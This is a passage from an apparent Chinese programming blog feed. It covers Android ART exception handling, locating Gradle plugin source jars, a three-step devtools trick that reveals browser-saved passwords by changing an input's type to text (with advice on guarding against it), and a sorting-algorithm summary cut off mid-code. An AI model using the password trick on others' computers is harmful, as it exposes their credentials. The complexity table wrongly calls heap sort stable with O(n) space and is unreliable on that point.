DoIntDivide(shadow_frame, inst-&gt;VRegA_22b(inst_data),</span><br><span class="line">                                shadow_frame.GetVReg(inst-&gt;VRegB_22b()), inst-&gt;VRegC_22b());</span><br><span class="line">    POSSIBLY_HANDLE_PENDING_EXCEPTION(!success, Next_2xx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>DoIntDivide</code>方法定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// art/runtime/interpreter/interpreter_common.h</span></span><br><span class="line"><span class="comment">// Handles div-int, div-int/2addr, div-int/li16 and div-int/lit8 instructions.</span></span><br><span class="line"><span class="comment">// Returns true on success, otherwise throws a java.lang.ArithmeticException and return false.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">DoIntDivide</span><span class="params">(ShadowFrame&amp; shadow_frame, <span class="keyword">size_t</span> result_reg,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">int32_t</span> dividend, <span class="keyword">int32_t</span> divisor)</span></span></span><br><span class="line"><span class="function">    <span class="title">REQUIRES_SHARED</span><span class="params">(Locks::mutator_lock_)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constexpr</span> <span class="keyword">int32_t</span> kMinInt = <span class="built_in">std</span>::numeric_limits&lt;<span class="keyword">int32_t</span>&gt;::min();</span><br><span class="line">    <span class="keyword">if</span> (UNLIKELY(divisor == <span class="number">0</span>)) &#123;</span><br><span class="line">        ThrowArithmeticExceptionDivideByZero();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以看到当被除数<code>divisor</code>的0是，就通过<code>ThrowArithmeticExceptionDivideByZero</code>方法抛出除零异常，继续跟踪：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// art/runtime/common_throws.cc</span></span><br><span class="line">ThrowArithmeticExceptionDivideByZero()  -&gt; ThrowException() -&gt;</span><br><span class="line"><span class="comment">// art/runtime/thread.cc</span></span><br><span class="line">    Thread::Current()-&gt; ThrowNewException(exception_descriptor, <span class="literal">nullptr</span>) -&gt; ThrowNewWrappedException(exception_class_descriptor, msg) -&gt;</span><br></pre></td></tr></table></figure><p>进入<code>art::Thread::ThrowNewWrappedException</code>方法后，会进行一大堆操作，包括获取当前线程的堆栈，最后赋值给<code>tlsPtr</code>这个大的结构体的<code>exception</code>。</p><p>也就是说当虚拟机一步一步执行Java指令的时候，当遇到类似除零这中异常操作时，就会抛出一个对应的异常，然后一步一步返回到当前执行执行的地方，将异常入栈，跳出当前指令循环（可能解释得不是很清楚，参考<a href="https://www.javaworld.com/article/2076868/how-the-java-virtual-machine-handles-exceptions.html" target="_blank" rel="noopener">这里</a>），也就是结束了Java层的线程循环，回到<code>art::Thread::CreateCallback</code>回调中，从而进行接下来的异常分发流程。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Android中，Java虚拟机（JVM）是如何处理异常的呢？&lt;/p&gt;
&lt;p&gt;在执行main函数的时候，如果运行过程中遇到异常问题，有两种情况：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过try-catch捕获已知或者未知的异常将问题处理并跳过，然后继续运行，确保程序不会崩溃&lt;/li&gt;
      
    
    </summary>
    
    
      <category term="JVM" scheme="http://blog.lxzh.app/tags/JVM/"/>
    
  </entry>
  
  <entry>
    <title>如何查看Gradle插件的源码</title>
    <link href="http://blog.lxzh.app/2019/11/08/View-Gradle-Plugin-Source-code/"/>
    <id>http://blog.lxzh.app/2019/11/08/View-Gradle-Plugin-Source-code/</id>
    <published>2019-11-07T18:10:40.000Z</published>
    <updated>2019-11-07T18:29:01.983Z</updated>
    
    <content type="html"><![CDATA[<p>在进行自定义Gradle插件开发的过程中，除了查阅官方文档，在网上搜索开源插件源码以外，还有一种方式可以获取到一些公开的插件的源码。</p><p>首先我们平时通过<code>apply plugin: &#39;com.android.application&#39;</code>引用的android这个插件的源码我们可以从aosp代码仓库里面找到，<a href="https://android.googlesource.com/platform/tools/base/+/refs/tags/android-10.0.0_r11/build-system/gradle/src/main/groovy/com/android/build/gradle/AppPlugin.groovy" target="_blank" rel="noopener">传送门</a>（这里给的是android-10.0.0_r11的，历史版本可以自行查找，需要fan qiang）</p><p>比如下面<code>firebase</code>用到的<code>google-service</code>插件也可以从aosp中<a href="https://android.googlesource.com/platform/tools/base/+/refs/tags/android-10.0.0_r11/build-system/google-services/src/main/groovy/com/google/gms/googleservices/GoogleServicesPlugin.groovy?autodive=0%2F%2F" target="_blank" rel="noopener">传送门</a>找到</p><p><code>apply plugin: &#39;com.google.gms.google-services&#39;</code></p><p>接着就是一些商用或者非商用sdk使用到的gradle插件了，往往我们比较好奇这个插件里面到底干了啥，或者刚好它有个好用的功能我也想借鉴一下，那么看其源码肯定是最直接好用的办法。</p><a id="more"></a><p>下面举个例子，比如：<strong>ShareSDK</strong></p><ol><li>按照<a href="https://www.mob.com/wiki/detailed?wiki=ShareSDK_Android_Title_ksjc&id=14" target="_blank" rel="noopener">官方文档</a>流程，依次完成以下两步：</li></ol><ul><li><p>打开项目根目录的build.gradle，在buildscrip–&gt;dependencies 模块下面添加 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">classpath ‘com.mob.sdk:MobSDK:2018.0319.1724’，如下所示；</span><br><span class="line">buildscript &#123;</span><br><span class="line">    repositories &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    dependencies &#123;</span><br><span class="line">        ...</span><br><span class="line">        classpath &quot;com.mob.sdk:MobSDK:2018.0319.1724&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在使用到Mob产品的module下面的build.gradle文件里面添加引用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apply plugin: &apos;com.mob.sdk&apos;</span><br></pre></td></tr></table></figure></li></ul><ol start="2"><li>添加依赖应用插件完毕后，点AS右上角的”sync now”同步一下</li><li>同步完成后首先在AS左侧的Project视图中<code>External Library</code>下面找找看是否有ShareSDK他家的sdk引入，如下表示引入成功。</li></ol><img src="http://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1573150864041.png" width="235"><ol start="4"><li>既然引入成功了，因为他们的插件名称叫<code>com.mob.sdk</code>，那么这个插件就一定缓存到我们PC本地了，所以用这个名字搜一下即可(Windows下有Everything这个工具简直完美), 很快就能在gradle的缓存目录找到这个插件，如下图(我这里修改了gradle的默认位置，Windows一般会在C盘：<code>C:\Users\xxx\.gradle\caches\modules-2\files-2.1</code>下面，Mac一般在<code>/Users/xxx/.gradle/caches/modules-2/files-2.1</code>)，</li></ol><img src="http://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1573150886274.png" width="309"><ol start="5"><li>找到插件位置后，在目录下继续找，会找到一个<code>xxx-source.jar</code>的文件，这个就是插件源码打成的jar包，实际就是个压缩文件，包含了插件groovy源码，解压即可，源码带注释真香ing<i class="qqlaugh">&ensp; &ensp;</i>。</li></ol><img src="http://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1573150900726.png" width="354">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在进行自定义Gradle插件开发的过程中，除了查阅官方文档，在网上搜索开源插件源码以外，还有一种方式可以获取到一些公开的插件的源码。&lt;/p&gt;
&lt;p&gt;首先我们平时通过&lt;code&gt;apply plugin: &amp;#39;com.android.application&amp;#39;&lt;/code&gt;引用的android这个插件的源码我们可以从aosp代码仓库里面找到，&lt;a href=&quot;https://android.googlesource.com/platform/tools/base/+/refs/tags/android-10.0.0_r11/build-system/gradle/src/main/groovy/com/android/build/gradle/AppPlugin.groovy&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;传送门&lt;/a&gt;（这里给的是android-10.0.0_r11的，历史版本可以自行查找，需要fan qiang）&lt;/p&gt;
&lt;p&gt;比如下面&lt;code&gt;firebase&lt;/code&gt;用到的&lt;code&gt;google-service&lt;/code&gt;插件也可以从aosp中&lt;a href=&quot;https://android.googlesource.com/platform/tools/base/+/refs/tags/android-10.0.0_r11/build-system/google-services/src/main/groovy/com/google/gms/googleservices/GoogleServicesPlugin.groovy?autodive=0%2F%2F&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;传送门&lt;/a&gt;找到&lt;/p&gt;
&lt;p&gt;&lt;code&gt;apply plugin: &amp;#39;com.google.gms.google-services&amp;#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;接着就是一些商用或者非商用sdk使用到的gradle插件了，往往我们比较好奇这个插件里面到底干了啥，或者刚好它有个好用的功能我也想借鉴一下，那么看其源码肯定是最直接好用的办法。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Little skill" scheme="http://blog.lxzh.app/tags/Little-skill/"/>
    
  </entry>
  
  <entry>
    <title>简单三步查看你浏览器保存的登录帐号密码</title>
    <link href="http://blog.lxzh.app/2018/07/25/Three-Step-To-View-Your-Saved-Password/"/>
    <id>http://blog.lxzh.app/2018/07/25/Three-Step-To-View-Your-Saved-Password/</id>
    <published>2018-07-25T12:50:00.000Z</published>
    <updated>2019-11-06T18:21:07.949Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题复现"><a href="#问题复现" class="headerlink" title="问题复现"></a>问题复现</h2><h3 id="1-在需要登录的网页上选择浏览器自动保存的账号，如简书："><a href="#1-在需要登录的网页上选择浏览器自动保存的账号，如简书：" class="headerlink" title="1. 在需要登录的网页上选择浏览器自动保存的账号，如简书："></a>1. 在需要登录的网页上选择浏览器自动保存的账号，如简书：</h3><p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1532522404518.png" alt="简书登录"></p><a id="more"></a><h3 id="2-浏览器右键查看-审查-元素调出查看元素侧边栏，如下图："><a href="#2-浏览器右键查看-审查-元素调出查看元素侧边栏，如下图：" class="headerlink" title="2. 浏览器右键查看(审查)元素调出查看元素侧边栏，如下图："></a>2. 浏览器右键查看(审查)元素调出查看元素侧边栏，如下图：</h3><p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1532521594696.png" alt="查看元素"></p><h3 id="3-修改上图中的input元素的type属性值，-quot-password-quot-改为-quot-text-quot-，回车"><a href="#3-修改上图中的input元素的type属性值，-quot-password-quot-改为-quot-text-quot-，回车" class="headerlink" title="3. 修改上图中的input元素的type属性值，&quot;password&quot;改为&quot;text&quot;，回车"></a>3. 修改上图中的input元素的<code>type</code>属性值，<code>&quot;password&quot;</code>改为<code>&quot;text&quot;</code>，回车</h3><p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1532521771132.png" alt="显示密码"></p><h2 id="规避办法"><a href="#规避办法" class="headerlink" title="规避办法"></a>规避办法</h2><p>正常情况下查看浏览器保存的账号密码需要输入系统密码或者验证浏览器的某项设定(不同浏览器有差异)，但此方法轻松的规避了权限验证获取到密码。这种方便用户的行为却带来了极大的密码泄露风险，根源上无法规避，只能在平时使用电脑时多注意一下，以下几点仅供参考：</p><ol><li><strong>电脑不用轻易借给他人使用，除非身边非常信任的人</strong></li><li><strong>设定一些易于记住的密码，浏览器里登录时重要账户选择不要保存密码，每次登录手动输入</strong></li><li><strong>离开电脑务必记得随时锁屏或者关机，登录系统一定要设定密码</strong></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;问题复现&quot;&gt;&lt;a href=&quot;#问题复现&quot; class=&quot;headerlink&quot; title=&quot;问题复现&quot;&gt;&lt;/a&gt;问题复现&lt;/h2&gt;&lt;h3 id=&quot;1-在需要登录的网页上选择浏览器自动保存的账号，如简书：&quot;&gt;&lt;a href=&quot;#1-在需要登录的网页上选择浏览器自动保存的账号，如简书：&quot; class=&quot;headerlink&quot; title=&quot;1. 在需要登录的网页上选择浏览器自动保存的账号，如简书：&quot;&gt;&lt;/a&gt;1. 在需要登录的网页上选择浏览器自动保存的账号，如简书：&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1532522404518.png&quot; alt=&quot;简书登录&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="网络安全" scheme="http://blog.lxzh.app/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>排序算法——汇总</title>
    <link href="http://blog.lxzh.app/2018/07/24/Sort-Algorithm-Summarizing/"/>
    <id>http://blog.lxzh.app/2018/07/24/Sort-Algorithm-Summarizing/</id>
    <published>2018-07-24T08:18:01.000Z</published>
    <updated>2019-11-06T18:21:07.950Z</updated>
    
    <content type="html"><![CDATA[<p>　　本文集中汇总<code>冒泡</code>、<code>插入(对半插入)</code>、<code>选择</code>、<code>希尔</code>、<code>堆排序</code>、<code>归并</code>、<code>快速</code>、<code>七种排序算法</code>，收集了网上的示意图、动图进行生动的展示。</p><a id="more"></a><blockquote><p>由于内容较多，这里只提供了<code>Java</code>代码int类型数组进行举例说明，其他语言或者数据类型请自行转换。</p></blockquote><h1 id="一、排序算法基础知识准备"><a href="#一、排序算法基础知识准备" class="headerlink" title="一、排序算法基础知识准备"></a>一、排序算法基础知识准备</h1><h2 id="1-Swap函数的三种实现"><a href="#1-Swap函数的三种实现" class="headerlink" title="1. Swap函数的三种实现"></a>1. Swap函数的三种实现</h2><p>　　首先针对排序常用到的数据交换Swap函数，汇总了一下它的三种实现方式：</p><ul><li>直接交换法：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 数组元素交换 直接交换</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Swap1</span><span class="params">(<span class="keyword">int</span>[] array,<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp=array[i];</span><br><span class="line">    array[i]=array[j];</span><br><span class="line">    array[j]=tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>异或交换法：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 数组元素交换 异或交换</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Swap2</span><span class="params">(<span class="keyword">int</span>[] array,<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">    array[i]^=array[j];</span><br><span class="line">    array[j]^=array[i];</span><br><span class="line">    array[i]^=array[j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>加法交换法：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 数组元素交换 加法交换</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Swap3</span><span class="params">(<span class="keyword">int</span>[] array,<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">    array[i]=array[i]+array[j];</span><br><span class="line">    array[j]=array[i]-array[j];</span><br><span class="line">    array[i]=array[i]-array[j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-算法复杂度"><a href="#2-算法复杂度" class="headerlink" title="2. 算法复杂度"></a>2. 算法复杂度</h2><table>    <tr><th rowspan="2">排序方式</th><th colspan="3" align="center">时间复杂度</th><th>空间复杂度</th><th rowspan="2">稳定性</th></tr>    <tr><th align="center">平均</th><th align="center">最好</th><th align="center">最坏</th><th align="center">平均</th></tr>    <tr><td align="center">冒泡排序</td><td>O(n²)</td><td>O(n)</td><td>O(n²)</td><td align="center">O(1)</td><td>稳定</td></tr>    <tr><td align="center">插入排序</td><td>O(n²)</td><td>O(n)</td><td>O(n²)</td><td align="center">O(1)</td><td>稳定</td></tr>    <tr><td align="center">选择排序</td><td>O(n²)</td><td>O(n²)</td><td>O(n²)</td><td align="center">O(1)</td><td>不稳定</td></tr>    <tr><td align="center">希尔排序</td><td>O(n¹·³)</td><td>O(n)</td><td>O(n²)</td><td align="center">O(1)</td><td>不稳定</td></tr>    <tr><td align="center">堆排序</td><td>O(n㏒₂n)</td><td>O(n㏒₂n)</td><td>O(n㏒₂n)</td><td align="center">O(n)</td><td>稳定</td></tr>    <tr><td align="center">归并排序</td><td>O(n㏒₂n)</td><td>O(n㏒₂n)</td><td>O(n㏒₂n)</td><td align="center">O(n)</td><td>稳定</td></tr>    <tr><td align="center">快速排序</td><td>O(n㏒₂n)</td><td>O(n㏒₂n)</td><td>O(n²)</td><td align="center">O(n㏒₂n)</td><td>不稳定</td></tr>    <tr><td align="center" colspan="6"></td></tr>    <tr><td align="center">计数排序</td><td>O(n+k)</td><td>O(n+k)</td><td>O(n+k)</td><td align="center">O(n+k)</td><td>稳定</td></tr>    <tr><td align="center">桶排序</td><td>O(n+k)</td><td>O(n)</td><td>O(n²)</td><td align="center">O(n+k)</td><td>稳定</td></tr>    <tr><td align="center">基数排序</td><td>O(n*k)</td><td>O(n*k)</td><td>O(n*k)</td><td align="center">O(n+k)</td><td>稳定</td></tr></table><h2 id="3-相关概念"><a href="#3-相关概念" class="headerlink" title="3. 相关概念"></a>3. 相关概念</h2><ul><li><strong>稳定</strong>：如果a原本在b前面，而a=b，排序之后a仍然在b的前面。</li><li><strong>不稳定</strong>：如果a原本在b的前面，而a=b，排序之后 a 可能会出现在 b 的后面。</li><li><strong>时间复杂度</strong>：对排序数据的总的操作次数。反映当n变化时，操作次数呈现什么规律。</li><li><strong>空间复杂度</strong>：是指算法在计算机内执行时所需存储空间的度量，它也是数据规模n的函数。 </li></ul><h1 id="二、7大排序算法"><a href="#二、7大排序算法" class="headerlink" title="二、7大排序算法"></a>二、7大排序算法</h1><p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/sortalgo.png" alt="排序算法分类"></p><h2 id="1-冒泡排序-Bubble-Sort-："><a href="#1-冒泡排序-Bubble-Sort-：" class="headerlink" title="1. 冒泡排序(Bubble Sort)："></a>1. 冒泡排序(Bubble Sort)：</h2><p>　　冒泡排序是一种简单的排序算法。它重复地走访过要排序的数列，一次比较两个元素，如果它们的顺序错误就把它们交换过来。走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的一端。 </p><p>　　根据冒泡的方向，可以分为前向冒泡和后向冒泡，对于升序排序：<strong>前向冒泡指较小的数逐渐浮到数列的前方，后向冒泡指较大的数逐渐后浮</strong>。降序排序则反之。</p><h3 id="1-1-算法描述"><a href="#1-1-算法描述" class="headerlink" title="1.1 算法描述"></a>1.1 算法描述</h3><p><strong>前向冒泡</strong></p><ul><li>比较第一个元素与后面一个元素，如果第一个比第二个大，就交换它们两个；</li><li>递增第二个索引，继续比较两个索引对应的元素，直到第二个索引到达数列末尾；</li><li>递增第一个索引，第二个索引回到第一个索引后面，如果第一个比第二个大，就交换它们两个；</li><li>重复2、3步，直到两个元素到达数列末尾截止，此时完成排序。</li></ul><p><strong>后向冒泡</strong></p><ul><li>比较相邻的元素。如果第一个比第二个大，就交换它们两个；</li><li>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对，这样在最后的元素应该会是最大的数；</li><li>针对所有的元素重复以上的步骤，除了最后一个；</li><li>重复步骤1~3，直到排序完成。<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/bubblesort.png" alt="冒泡排序示意图"></li></ul><h3 id="1-2-动图演示-后向冒泡"><a href="#1-2-动图演示-后向冒泡" class="headerlink" title="1.2 动图演示(后向冒泡)"></a>1.2 动图演示(后向冒泡)</h3><p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/bubblesort1.gif" alt="冒泡排序演示图1"></p><p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/bubblesort2.gif" alt="冒泡排序演示图2"></p><h3 id="1-3-代码实现"><a href="#1-3-代码实现" class="headerlink" title="1.3 代码实现"></a>1.3 代码实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 冒泡排序 前向冒泡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array 待排序的数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> asc   是否为升序排序模式 true:升序 false:降序</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">BubbleSortForward</span><span class="params">(<span class="keyword">int</span>[] array,<span class="keyword">boolean</span> asc)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=array.length;</span><br><span class="line">    <span class="keyword">if</span>(asc)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len-<span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;len;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(array[i]&gt;array[j])&#123;</span><br><span class="line">                    Swap(array,i,j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len-<span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;len;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(array[i]&lt;array[j])&#123;</span><br><span class="line">                    Swap(array,i,j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 冒泡排序 后向冒泡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array 待排序的数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> asc   是否为升序排序模式 true:升序 false:降序</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">BubbleSortBackword</span><span class="params">(<span class="keyword">int</span>[] array,<span class="keyword">boolean</span> asc)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=array.length;</span><br><span class="line">    <span class="keyword">if</span>(asc)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len-<span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;len-<span class="number">1</span>-i;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(array[j]&gt;array[j+<span class="number">1</span>])&#123;</span><br><span class="line">                    Swap(array,j,j+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len-<span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;len-<span class="number">1</span>-i;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(array[j]&lt;array[j+<span class="number">1</span>])&#123;</span><br><span class="line">                    Swap(array,j,j+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-4-算法复杂度分析"><a href="#1-4-算法复杂度分析" class="headerlink" title="1.4 算法复杂度分析"></a>1.4 算法复杂度分析</h3><p>　　根据冒泡排序的原理，若原数组本身就是有序的（这是最好情况），仅需n-1次比较就可完成；若是倒序，比较次数为 n-1+n-2+…+1=n(n-1)/2，交换次数和比较次数等值。所以，其时间复杂度依然为O(n²）。</p><h2 id="2-插入排序"><a href="#2-插入排序" class="headerlink" title="2 插入排序"></a>2 插入排序</h2><h3 id="1-1-算法描述-1"><a href="#1-1-算法描述-1" class="headerlink" title="1.1 算法描述"></a>1.1 算法描述</h3><p>　　直接插入排序基本思想是<strong>每一步将一个待排序的记录，插入到前面已经排好序的有序序列中去，直到插完所有元素为止</strong>。<img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/insertsort.png" alt="插入排序示意图"></p><h3 id="1-2-动图演示"><a href="#1-2-动图演示" class="headerlink" title="1.2 动图演示"></a>1.2 动图演示</h3><p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/insertsort1.gif" alt="插入排序演示图1"><br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/insertsort2.gif" alt="插入排序演示图2"></p><h3 id="1-3-代码实现-1"><a href="#1-3-代码实现-1" class="headerlink" title="1.3 代码实现"></a>1.3 代码实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 插入排序</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array 待排序的数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> asc   是否为升序排序模式 true:升序 false:降序</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">InsertSort</span><span class="params">(<span class="keyword">int</span>[] array,<span class="keyword">boolean</span> asc)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=array.length;</span><br><span class="line">    <span class="keyword">int</span> tmp;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">if</span>(asc)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">            tmp=array[i];</span><br><span class="line">            <span class="keyword">for</span>(j=i;j&gt;<span 